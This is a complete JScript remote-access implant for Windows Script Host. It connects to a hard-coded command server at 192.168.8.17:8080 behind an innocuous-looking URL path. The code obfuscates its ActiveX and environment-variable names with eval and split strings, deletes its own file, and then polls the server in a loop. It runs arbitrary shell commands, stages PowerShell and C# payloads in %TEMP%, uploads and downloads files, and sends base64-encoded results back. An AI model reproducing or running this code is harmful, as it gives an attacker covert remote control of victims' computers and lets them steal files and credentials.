//Define variables
var ho = "192.168."
var me = "8.17"
var p0rt= "8080"
var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
var proto = "ht"+"tp"+":/"+"/"
var home = proto+ho+me+":"+p0rt+uri
var sleepytime = 3000 //in milliseconds

var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
var xFrameOptions = "SAMEORIGIN"
var contentEncoding = "gzip"
var contentType = "text/xml"

var x = "iveXOb"
eval("var runner = new Act"+x+"ject(\"WScr\" +   \"ipt.Sh\"+  \"ell\")")

var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");

var id = Math.floor(Math.random() * 9999999999).toString()
var type = "js"

//Find file we are running in
var selfpath = WScript.ScriptFullName
var fso = new ActiveXObject("Scripting.FileSystemObject")
if(fso.FileExists(selfpath))
{
  try
  {
    //Read data from self script file
    var fd = fso.OpenTextFile(selfpath)
	  var selfdata = fd.ReadAll();
	  fd.close()
    //Delete our own script file
    fso.DeleteFile(selfpath, true)
  }
  catch (e) {};
}

//Helper functions
function post(home, response) {
  var res;
  try
  {
    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
    WinHttpReq.Open("POST", home, false);
    //Set HTTP Headers
    WinHttpReq.setRequestHeader("User-Agent", useragent);
    WinHttpReq.setRequestHeader("X-Frame-Options", xFrameOptions);
    WinHttpReq.setRequestHeader("Content-Type", contentType);
    //Send the HTTP request.
    WinHttpReq.Send(response);
    //Wait for the entire response.
    WinHttpReq.WaitForResponse();
    //Retrieve the response text.
    res = WinHttpReq.ResponseText;
  }
  catch (objError)
  {
    res = objError + "\n"
    res += "WinHTTP returned error: " + (objError.number & 0xFFFF).toString() + "\n\n";
    res += objError.description;
  }
  return res;
}

function writebinfile(filename, content) {
	var stream = WScript.CreateObject("ADODB.Stream")
	stream.Open()	
	stream.Type = 1 //adTypeBinary
	stream.Write(content)
	stream.SaveToFile(filename)
	stream.Close()
}

function readbinfile(filename) {
	var stream = WScript.CreateObject("ADODB.Stream")
	stream.Open()
	stream.Type = 1 //adTypeBinary
	stream.LoadFromFile(filename)
	var bytes = stream.Read()
	stream.Close()
	return bytes
}

function str2bin(data) {
   var istream = WScript.CreateObject("ADODB.Stream");
   istream.Type = 2
   istream.CharSet = "us-ascii"
   istream.Open()
   istream.WriteText(data)
   istream.Position = 0
   istream.Type = 1
   return istream.Read()
}
function b64e(data) {
  var xml = WScript.CreateObject("MSXml2.DOMDocument");
  var element = xml.createElement("Base64Data");
  element.dataType = "bin.base64";
  if(typeof(data) == "string") {
    element.nodeTypedValue = str2bin(data);
  }
  else {
    element.nodeTypedValue = data;
  }
  return element.text.replace(/\n/g, "");
}

function bin2str(data) {
  var istream = WScript.CreateObject("ADODB.Stream")
  istream.Type = 1
  istream.Open()
  istream.Write(data)
  istream.Position = 0
  istream.Type = 2
  istream.CharSet = "us-ascii"
  return istream.ReadText()
}

function b64d(data, type) {
  var xml = WScript.CreateObject("MSXml2.DOMDocument");
  var element = xml.createElement("Base64Data");
  element.dataType = "bin.base64"
  element.text = data
  if(type == "bin") {
    return element.nodeTypedValue
  }
  else {
    return bin2str(element.nodeTypedValue)
  }
}

//Main
while(true)
{
  try
  {
    var retval = ""
    var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
    var serverMsg = post(home, checkin);
	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
    // Convert json string to json object
    eval("jsObject="+jsondata);

    if(jsObject.cmnd)
    {
      var rettype = "retval"
      //kill
      if(jsObject.cmnd == "quit") {
        if(fso.FileExists(selfpath)) {
          fso.DeleteFile(selfpath, true)
        }
        WScript.Quit(1);
      }

      //spawn: writes js to %TEMP%
      else if(jsObject.cmnd == "spawn") {
        fd = fso.CreateTextFile(temp+"\\"+id+".js")
        fd.WriteLine(selfdata)
        fd.close()
        runner.Run(temp+"\\"+id+".js")
        retval = "[+] Spawn success..."
      }

      //psh and cs
      //duplicate code here and cmnd... :(
      else if((jsObject.cmnd.split(" ")[0] == "psh") || (jsObject.cmnd.split(" ")[0] == "cs") || (jsObject.cmnd.split(" ")[0] == "shc")) {
         fd = fso.CreateTextFile(temp + "\\" + id + ".txt")
         msb = jsObject.cmnd.split(" ")[1]
         msbdata = b64d(jsObject.cmnd.split(" ")[2], "txt")
         fd.WriteLine(msbdata)
         fd.close()
         if(jsObject.cmnd.split(" ")[0] == "shc") {
           runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt", 0, true)
           retval = "[*] Shc cmnd appeared successful"
         }
         else {
           runner.Run(cs +" /q /c " + msb + " " + temp + "\\" + id + ".txt" + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
         }
         if(fso.FileExists(temp + "\\__" + id + ".txt")) {
           fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
           retval = fd.ReadAll()
           fd.close()
           fso.DeleteFile(temp + "\\__" + id + ".txt", true)
         }
        if(fso.FileExists(temp + "\\" + id + ".txt")) {
          fso.DeleteFile(temp + "\\" + id + ".txt", true)
        }
      }
	  
      else if(jsObject.cmnd.split(" ")[0] == "dl") {
        var array = jsObject.cmnd.split(" ")
        array.shift() //Cuts off the first element in the array
        var filepath = array.join(" ")
        if(fso.FileExists(filepath)) {
          retval = readbinfile(filepath)
          rettype = "dl"
        }
        else {
          retval = "[!] Could not read file: " + filepath
        }
      }

	  	else if(jsObject.cmnd.split(" ")[0] == "up") {
                  try {
                    var array = jsObject.cmnd.split(" ")
                    content = b64d(array[1], "bin")
                    array.shift()
                    array.shift()
                    filename = array.join(" ")
                    writebinfile(filename, content)
                    retval = "[*] File uploaded: " + filename
                  }
                  catch (e) {
                    retval = "[-] Could not upload file: " + filename
                  }
                }

	    //credit to nate and 0sum
	    else {
        runner.Run(cs +" /q /c " + jsObject.cmnd + " 1> " + temp + "\\__" + id + ".txt" + " 2>&1", 0, true)
		    if(fso.FileExists(temp + "\\__" + id + ".txt")) {
                      try {
		        fd = fso.OpenTextFile(temp + "\\__" + id + ".txt")
                        retval = fd.ReadAll()
		        fd.close()
		        fso.DeleteFile(temp + "\\__" + id + ".txt", true)
                      }
                      catch (e) { }
		    }
      }
      if(retval == "") {
        retval = "[*] No results to return or error getting result data"
      }
      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","'+rettype+'":"'+b64e(retval)+'"}';
      jsObject.cmnd = ""
      post(home, resp)
    }
  }
  catch (e) {
    WScript.Sleep(sleepytime);
  }
  WScript.Sleep(sleepytime);
}

